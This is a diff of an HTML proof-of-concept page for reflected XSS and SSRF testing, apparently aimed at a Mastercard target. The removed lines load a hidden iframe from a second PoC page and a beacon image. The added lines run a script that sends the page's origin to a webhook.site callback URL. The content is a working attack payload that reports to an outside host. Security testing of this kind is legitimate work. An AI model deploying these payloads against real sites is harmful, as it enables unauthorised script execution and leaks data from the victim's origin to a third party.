@@ -1,10 +1,12 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Reflected XSS Test</title>
+</head>
 <body>
-<!-- Etapa 1: carga secundaria oculta -->
-<iframe src="https://juanoviedo28.github.io/mastercard-xss-poc/ssrf-part3.html" style="display:none;"></iframe>
-
-<!-- Confirmación de ejecución básica -->
-<img src="https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?step=launcher-img">
+<h1>PoC loaded successfully</h1>
+<script>
+  fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?proof=executed&origin=" + encodeURIComponent(document.location.origin));
+</script>
 </body>
 </html>
